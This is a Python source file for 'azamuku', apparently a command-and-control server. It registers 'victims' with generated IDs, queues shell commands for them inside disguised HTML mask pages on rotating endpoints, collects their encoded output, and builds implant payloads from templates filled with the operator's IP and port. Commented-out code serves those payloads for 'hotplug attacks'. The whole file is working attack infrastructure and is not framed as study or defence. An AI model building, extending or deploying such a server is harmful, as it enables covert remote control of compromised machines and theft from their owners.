from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import ssl
import threading
import time
import random
import os

"""
written by otter - github.com/whatotter
supported by Fan2K - github.com/Christian93111

"""

vicInfo = {} # info of victims
connects = [] # victims that actually connected back
endpoints = [] # endpoints that mirror the pool
authorized = [] # authorized uids that can connect to azamuku
commandPool = {} # command pool of commands - "UID": "command"
responsePool = {} # response pool of previous commands - "UID": "respnose"
enableGrab = False # enable grabbing old sessions (destroys the entire authentication thing)
h = "Authorization" # header to grab for authentication
# ^ its like a staircase, so cool
activeHttpsPort = 0
activeTunnel = None
lastSeen = {} # track last seen time for each client - "UID": timestamp
disconnected = [] # list of UIDs that have disconnected
client_ips = {} # store recognized IP for each client - "UID": "IP"


class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

class azamukuHandler(BaseHTTPRequestHandler):
    def _send_response(self, status_code=200, content_type='text/html'):
        self.send_response(status_code)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def alternatingEndpoint(self, comment:str, mask=random.choice(os.listdir("./core/masks/html"))):
        f = open(os.path.join("./core/masks/html/", mask), "r").read()
        f = f.replace("%()%", comment)
        return f.encode('ascii')

    def do_GET(self):
        global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h, lastSeen
        auth = self.headers.get(h, None)
        if auth: auth = auth.strip()
        

        # Update last seen time for this client
        if auth and auth in authorized:
            lastSeen[auth] = time.time()
            
            # Update client IP
            # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
            client_ip = self.headers.get('X-Forwarded-For')
            if client_ip:
                # X-Forwarded-For can be a comma-separated list of IPs
                # The first one is the original client IP
                client_ip = client_ip.split(',')[0].strip()
            else:
                client_ip = self.headers.get('X-Real-IP')
                
            if not client_ip:
                # Fallback to direct connection IP
                client_ip = self.client_address[0]
                
            client_ips[auth] = client_ip

        if self.path == "/e030d4f6":
            if auth in authorized:
                if auth not in list(connects):
                    connects.append(auth)
                    if auth in disconnected:
                        disconnected.remove(auth)

                self._send_response()
                a = random.choice(endpoints).encode('ascii')
                self.wfile.write(a)
                return
            else:
                if enableGrab:
                    authorized.append(auth)
                    self._send_response()
                    a = random.choice(endpoints).encode('ascii')
                    self.wfile.write(a)
                    return
                
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return
            
        # TEMPORARILY DISABLED - hotplug endpoint
        # if self.path == "/hotplug":
        #     # Serve tunnel payload directly from main server
        #     # Check authentication
        #     auth = self.headers.get(h, None)
        #     if auth: auth = auth.strip()

        #     if not auth or auth not in authorized:
        #         if not enableGrab:
        #             self._send_response(404)
        #             self.wfile.write(b'Not Found')
        #             return
        #         else:
        #             # If grab is enabled, we allow unauthorized requests (and likely add them?)
        #             # But for fetching payload, usually we just serve it if grab is on.
        #             pass

        #     host = self.headers.get('Host')
        #     if host:
        #         ip = host 
        #     else:
        #         ip = "127.0.0.1"
            
        #     # Use tunnel.txt for the payload content
        #     try:
        #         # We use a dummy port "443" as it's not used in tunnel.txt template
        #         payload_content = payload.generatePayload(ip, "443", "tunnel.txt")
        #         self._send_response()
        #         self.wfile.write(payload_content.encode('ascii'))
        #     except Exception as e:
        #         self._send_response(500)
        #         self.wfile.write(str(e).encode('ascii'))
        #     return

        if self.path[1:] in endpoints: # if its a *command pool endpoint*


            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    if auth not in list(connects):
                        connects.append(auth)
                        if auth in disconnected:
                            disconnected.remove(auth)

                    self._send_response()
                    if auth in list(commandPool):
                        self.wfile.write(self.alternatingEndpoint("!"+commandPool[auth]))
                        return
                    else:
                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints)))
                        return
                else:
                    if not enableGrab:
                        self._send_response(404)
                        self.wfile.write(b'Not Found')
                    else:
                        connects.append(auth)
                        if auth in disconnected:
                            disconnected.remove(auth)
                        self._send_response()
                        self.wfile.write(self.alternatingEndpoint("*"+random.choice(endpoints))) # make the client rerun the request again

                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return

    def do_POST(self):
        global authorized, endpoints, commandPool, responsePool, h, lastSeen
        body = self.rfile.read(int(self.headers['Content-Length'])).decode('ascii')
        auth = self.headers.get(h, None)
        

        # Update last seen time for this client
        if auth and auth in authorized:
            lastSeen[auth] = time.time()

            # Update client IP
            # Check for proxy headers first (X-Forwarded-For, X-Real-IP)
            client_ip = self.headers.get('X-Forwarded-For')
            if client_ip:
                client_ip = client_ip.split(',')[0].strip()
            else:
                client_ip = self.headers.get('X-Real-IP')
                
            if not client_ip:
                client_ip = self.client_address[0]
                
            client_ips[auth] = client_ip

        if self.path[1:] in endpoints: # if its a *command pool endpoint*


            if auth == None:
                self._send_response(404)
                self.wfile.write(b'Not Found')
                return
            else:
                if auth in authorized:
                    self._send_response()
                    ep = random.choice(endpoints).encode('ascii')
                    self.wfile.write(ep)

                    if auth in list(commandPool):
                        if len(body) != 0:
                            responsePool[auth] = ''.join([chr(int(x)) for x in body.split(' ')]).strip()
                        else:
                            responsePool[auth] = ''
                        commandPool.pop(auth)

                    return
                else:
                    self._send_response(404)
                    self.wfile.write(b'Not Found')
                    return

        else:
            self._send_response(404)
            self.wfile.write(b'Not Found')
            return
        
    def log_message(self, format, *args):
        return
    
# TEMPORARILY DISABLED - azamukuHotplugHandler
# class azamukuHotplugHandler(BaseHTTPRequestHandler):
#     """
#     a tiny handler to minimize the command as much as possible on hotplug attacks
#     """
#     def _send_response(self, status_code=200, content_type='text/html'):
#         self.send_response(status_code)
#         self.send_header('Content-type', content_type)
#         self.end_headers()

#     def do_GET(self):
#         global authorized, endpoints, commandPool, responsePool, connects, enableGrab, h
#         auth = self.headers.get(h, None)
#         if auth: auth = auth.strip()
        
#         ip = self.headers.get("i", None)
#         if ip: ip = ip.strip()
        
#         port = self.headers.get("p", None)
#         if port: port = port.strip()

#         if self.path == "/":
#             payload_file = "http.txt"

#             # Check if requested port matches known HTTPS port or 443
#             try:
#                 if port and (int(port) == activeHttpsPort or int(port) == 443):
#                     payload_file = "https.txt"
#             except: pass
            
#             # Prioritize tunnel payloads if active
#             if activeTunnel == "ngrok":
#                 payload_file = "ngrok.txt"
#             elif activeTunnel == "localtunnel":
#                 payload_file = "localtunnel.txt"

#             if auth in authorized: # free only for people with nice hands (authorized)
#                 self._send_response()
#                 self.wfile.write(payload.generatePayload(ip, port, payload_file).encode('ascii'))
#             else:
#                 if not enableGrab: # not free for everyone's grubby hands (unauthorized)
#                     self._send_response(404)
#                     self.wfile.write(b'Not Found')
#                 else: # free for everyone's grubby hands (unauthorized)
#                     self._send_response()
#                     self.wfile.write(payload.generatePayload(ip, port, payload_file).encode('ascii'))

#             return

#         else:
#             self._send_response(404)
#             self.wfile.write(b'Not Found')
#             return
        
#     def log_message(self, format, *args):
#         return

class azamuku:
    """
    a class to control azamuku's backend communications
    """
    def __init__(self) -> None:
        self.endpoints = []

        self.httpServer = None
        self.httpsServer = None
        self.hotplugServer = None
        pass

    """ HTTP servers. """
    def _run_http(self, ip, server_class=ThreadingHTTPServer, handler_class=azamukuHandler, port=80):
        httpd = server_class((ip, port), handler_class)
        self.httpServer = httpd
        httpd.serve_forever()

    def _run_https(self, ip, server_class=ThreadingHTTPServer, handler_class=azamukuHandler, port=443, certfile='server.pem', keyfile='key.pem'):
        httpd = server_class((ip, port), handler_class)
        httpd.socket = ssl.wrap_socket(httpd.socket, certfile=certfile, keyfile=keyfile, server_side=True)

        self.httpsServer = httpd
        httpd.serve_forever()

    # TEMPORARILY DISABLED - _run_Hotplug method
    # def _run_Hotplug(self, ip, port=7979):
    #     httpd = HTTPServer((ip, port), azamukuHotplugHandler)
    #     self.hotplugServer = httpd
    #     httpd.serve_forever()


    """ etc. """
    def set_endpoints(self, file="./core/masks/endpoints.txt"):
        global endpoints
        for x in open(file, "r").readlines():
            self.endpoints.append(x.strip())
            endpoints.append(x.strip())

        return True
    
    """ user functions. """
    def start(self, ip, httpPort=80, httpsPort=443, certfile='server.pem', keyfile='key.pem', tunnelType=None):
        self.set_endpoints()

        if httpPort != 0:
            threading.Thread(target=self._run_http, args=(ip,), kwargs={"port": httpPort}, daemon=True).start()

            while self.httpServer == None: # wait for server to go up
                time.sleep(0.1)

        if httpsPort != 0:
            global activeHttpsPort
            activeHttpsPort = httpsPort
            threading.Thread(target=self._run_https, args=(ip,), kwargs={"port": httpsPort, "certfile":certfile, "keyfile":keyfile}, daemon=True).start()

            while self.httpsServer == None: # wait for server to go up
                time.sleep(0.1)

        if tunnelType:
            global activeTunnel
            activeTunnel = tunnelType

        return True

    def stop(self):
        if self.httpServer != None:
            self.httpServer.shutdown()

        if self.httpsServer != None:
            self.httpsServer.shutdown()
        return True
    
    # TEMPORARILY DISABLED - startHotplug and stopHotplug methods
    # def startHotplug(self, ip, port=7979):
    #     threading.Thread(target=self._run_Hotplug, daemon=True, args=(ip,), kwargs={"port": port}).start()

    #     while self.hotplugServer == None: # wait for serevr to go up
    #         time.sleep(0.1)

    #     return True
    
    # def stopHotplug(self):
    #     if self.hotplugServer != None:
    #         self.hotplugServer.shutdown()

    #     return True
    
    
    
class payload:
    def genUID(y=32, chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"):
        global authorized
        uid = ''.join([random.choice(chars) for x in range(y)])
        authorized.append(uid)
        return uid
    
    def generatePayload(ip, port, payloadFile):
        global endpoints
        uid = payload.genUID()
        replaces = {
            "%ip%": ip,
            "%port%": port,
            "%auth%": uid,
            "%startpool%": random.choice(endpoints)
        }

        payloadData = open(os.path.join("./core/payloads/", payloadFile), "r").read()
        for x,y in replaces.items():
            payloadData = payloadData.replace(x, y)

        return payloadData

class client:
    def __init__(self, uid) -> None:
        self.uid = uid
        pass

    def run(self, command:str):
        global commandPool, responsePool, connects
        
        commandPool[self.uid] = command
        while True:
            if self.uid in list(responsePool):
                response = responsePool[self.uid]
                responsePool.pop(self.uid)
                return response
            elif self.uid not in connects:
                raise ConnectionError("client disconnected")
            else:
                time.sleep(0.1)